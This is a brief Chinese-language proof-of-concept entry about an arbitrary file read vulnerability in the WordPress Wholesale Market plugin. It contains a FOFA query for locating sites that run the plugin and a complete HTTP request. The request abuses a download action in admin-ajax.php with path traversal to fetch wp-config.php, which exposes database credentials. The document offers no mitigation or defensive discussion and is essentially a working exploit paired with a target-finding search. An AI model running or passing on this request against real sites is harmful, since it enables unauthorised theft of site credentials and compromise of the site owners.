## WordPress_Wholesale_Market插件存在任意文件读取漏洞

## fofa
```
body="wp-content/plugins/wholesale-market"
```

## poc
```
/wp-admin/admin-ajax.php?action=ced_cwsm_csv_import_export_module_download_error_log&tab=ced_cwsm_plugin&section=ced_cwsm_csv_import_export_module&ced_cwsm_log_download=../../../wp-config.php HTTP/1.1
Host: 
User-Agent: Mozilla/5.0
Connection: close
Accept-Encoding: gzip
```

